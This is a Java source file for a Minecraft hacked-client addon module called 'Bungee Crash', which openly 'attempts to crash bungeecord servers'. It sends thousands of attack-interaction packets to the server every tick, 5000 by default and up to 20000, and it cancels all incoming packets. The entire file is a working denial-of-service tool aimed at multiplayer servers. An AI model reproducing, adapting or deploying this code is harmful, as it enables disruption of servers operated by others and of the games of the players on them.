package me.onlyrain.randomaddon.modules.crystalass.crash;

import me.onlyrain.randomaddon.RandomAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;

public class BungeeCrash extends Module {
    private final SettingGroup sgGeneral;
    private final Setting<Integer> amount;
    private final Setting<Boolean> doCrash;
    private final Setting<Boolean> preventBungeeBounces;
    private final Setting<Boolean> autoDisable;

    public BungeeCrash() {
        super(RandomAddon.CATEGORYC, "Bungee Crash", "Attempts to crash bungeecord servers.");
        this.sgGeneral = this.settings.getDefaultGroup();
        this.amount = this.sgGeneral.add(((IntSetting.Builder) ((IntSetting.Builder) ((IntSetting.Builder) (new IntSetting.Builder()).name("amount")).description("How many packets to send to the server per tick.")).defaultValue(5000)).min(1).sliderMin(1).sliderMax(20000).build());
        this.doCrash = this.sgGeneral.add(((BoolSetting.Builder) ((BoolSetting.Builder) ((BoolSetting.Builder) (new BoolSetting.Builder()).name("do-crash")).description("Does the crash.")).defaultValue(true)).build());
        this.preventBungeeBounces = this.sgGeneral.add(((BoolSetting.Builder) ((BoolSetting.Builder) ((BoolSetting.Builder) (new BoolSetting.Builder()).name("prevent-bungee-bounces")).description("Prevents bungee bounces client side.")).defaultValue(true)).build());
        this.autoDisable = this.sgGeneral.add(((BoolSetting.Builder) ((BoolSetting.Builder) ((BoolSetting.Builder) (new BoolSetting.Builder()).name("auto-disable")).description("Disables module on kick.")).defaultValue(true)).build());
    }

    @EventHandler
    private void onPacketReceive(PacketEvent.Receive event) {
        if ((Boolean) this.preventBungeeBounces.get()) {
            event.setCancelled(true);
        }

    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!mc.isInSingleplayer()) {
            if ((Boolean) this.doCrash.get()) {
                for (int i = 0; i < (Integer) this.amount.get(); ++i) {
                    if (this.mc.player != null) {
                        this.mc.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(this.mc.player, false));
                    }
                }

            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if ((Boolean) this.autoDisable.get()) {
            this.toggle();
        }

    }
}
